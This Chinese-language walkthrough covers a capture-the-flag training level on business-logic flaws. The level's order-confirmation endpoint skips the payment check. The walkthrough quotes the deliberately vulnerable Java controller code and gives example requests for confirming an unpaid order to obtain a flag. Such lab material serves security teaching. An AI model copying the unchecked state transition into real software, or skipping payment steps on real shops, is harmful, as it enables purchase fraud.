# Level 3 — 流程跳过

## 关卡说明

本关模拟订单购买流程，包含三个步骤：创建订单 → 支付 → 确认。但确认接口未校验订单的支付状态，攻击者可以跳过支付步骤直接确认订单，实现0元购买。

**目标**：跳过支付步骤，直接确认订单，获取 Flag。

## 漏洞原理

### 代码逻辑分析

本关的后端代码位于 `ProcessSkipController.java`，相关接口：

```
GET  /api/challenge/biz-logic/order/products  — 获取商品列表
POST /api/challenge/biz-logic/order/create     — 步骤1：创建订单
POST /api/challenge/biz-logic/order/pay        — 步骤2：支付订单
POST /api/challenge/biz-logic/order/confirm    — 步骤3：确认订单
GET  /api/challenge/biz-logic/order/status     — 查询订单状态
```

**商品信息**：

| 商品 | 价格 |
|------|------|
| Premium Membership | $99.99 |
| VIP Package | $199.99 |

**正常流程**：

```
1. 创建订单 → status: pending_payment, paid: false
2. 支付订单 → status: paid, paid: true
3. 确认订单 → status: confirmed
```

**漏洞利用流程**：

```
1. 创建订单 → status: pending_payment, paid: false
2. 跳过支付！直接确认订单
3. 确认接口不检查 paid 状态 → status: confirmed, paid: false → 返回 Flag
```

**数据流**：

```
创建订单 POST /create {productId: 1}
    ↓
返回 orderId, status=pending_payment, paid=false
    ↓
【漏洞】跳过支付步骤，直接调用确认接口
POST /confirm {orderId: "ORD-xxx"}
    ↓
confirmOrder() 方法检查 isPaid：
    - paid=false → 返回 Flag（漏洞触发）
    - paid=true  → 正常确认
```

**漏洞点**：

1. **确认接口不校验支付状态**：`confirmOrder()` 方法虽然读取了 `paid` 字段，但当 `paid=false` 时仍然允许确认订单。
2. **业务流程无状态机约束**：订单状态转换没有严格的流程控制，可以从 `pending_payment` 直接跳到 `confirmed`。

### 源码关键片段

```java
// ProcessSkipController.java — 漏洞核心
@PostMapping("/confirm")
public Map<String, Object> confirmOrder(@RequestBody Map<String, Object> request) {
    Boolean isPaid = (Boolean) order.get("paid");
    
    if (!isPaid) {
        // 漏洞触发：未支付却确认成功
        String flag = flagService.getFlag("business-logic", "level3");
        order.put("status", "confirmed");
        result.put("paid", false);
        result.put("flag", flag);
    } else {
        // 正常流程
        order.put("status", "confirmed");
        result.put("paid", true);
    }
}
```

## 通关步骤

### Step 1：创建订单

```json
POST /api/challenge/biz-logic/order/create
{
  "productId": 1
}
```

响应中获取 `orderId`：

```json
{
  "success": true,
  "orderId": "ORD-1703xxxxxx",
  "status": "pending_payment"
}
```

### Step 2：跳过支付，直接确认

```json
POST /api/challenge/biz-logic/order/confirm
{
  "orderId": "ORD-1703xxxxxx"
}
```

### Step 3：获取 Flag

确认成功后，响应中包含 Flag：

```json
{
  "success": true,
  "message": "Order confirmed successfully!",
  "paid": false,
  "flag": "flag{...}"
}
```

## 涉及文件

| 文件 | 说明 |
|------|------|
| `controller/challenge/businesslogic/ProcessSkipController.java` | 后端订单流程接口 |
| `service/FlagService.java` | Flag 获取与验证 |
